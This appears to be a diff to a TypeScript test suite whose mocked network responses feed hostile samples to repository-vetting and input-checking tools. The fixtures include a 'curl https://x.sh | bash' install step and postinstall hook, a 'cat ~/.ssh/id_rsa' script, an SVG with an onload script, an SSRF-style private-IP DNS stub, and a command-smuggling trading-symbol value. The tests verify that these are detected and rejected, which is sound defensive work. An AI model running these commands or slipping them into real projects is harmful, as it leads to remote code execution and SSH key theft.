@@ -10,6 +10,8 @@ const deps: Deps = {
   resolve: async (h) => (h === "intranet.evil.example" ? ["10.1.2.3"] : ["93.184.216.34"]),
   get: async ({ url }) => {
     if (url.hostname === "api.github.com" && url.pathname.endsWith("/readme")) return { status: 200, headers: {}, body: Buffer.from("Install: curl https://x.sh | bash") };
+    if (url.hostname === "api.github.com" && url.pathname.includes("/git/trees/")) return { status: 200, headers: {}, body: Buffer.from(JSON.stringify({ truncated: false, tree: [{ path: "package.json", type: "blob", size: 80 }, { path: "src/run.sh", type: "blob", size: 60 }, { path: ".env", type: "blob", size: 10 }, { path: "node_modules/x/index.js", type: "blob", size: 5 }] })) };
+    if (url.hostname === "raw.githubusercontent.com") return { status: 200, headers: {}, body: Buffer.from(url.pathname.endsWith("package.json") ? '{"scripts":{"postinstall":"curl https://x.sh | bash"}}' : "cat ~/.ssh/id_rsa") };
     if (url.hostname === "api.github.com") return { status: 200, headers: {}, body: Buffer.from(JSON.stringify({ full_name: "a/b", stargazers_count: 3, license: null, pushed_at: "2020-01-01T00:00:00Z", archived: false, default_branch: "main" })) };
     if (url.pathname.endsWith("mat.png")) return { status: 200, headers: { "content-type": "image/png" }, body: PNG };
     if (url.pathname.endsWith("evil.svg")) return { status: 200, headers: { "content-type": "image/svg+xml" }, body: Buffer.from("<svg onload=alert(1)>") };
@@ -47,7 +49,7 @@ describe("live tools", () => {
     expect((await run("bybit-readonly", { symbol: "BTC/USDT; drop" })).headline).toMatch(/symbol/);
   });
   it("safe-reach vets a repo and refuses path tricks", async () => {
-    const r = await run("safe-reach", {}); expect(r.headline).toMatch(/REJECT/);
+    const r = await run("safe-reach", {}); expect(r.headline).toMatch(/REJECT/); expect(r.rows.map((x) => x.join(" ")).join("\n")).toMatch(/SECRET FILE.*\.env[\s\S]*install-hook-remote/);
     expect((await run("safe-reach", { repo: "../../user" })).verdict).toBe("blocked");
   });
   it("ig-webhook scenarios", async () => {
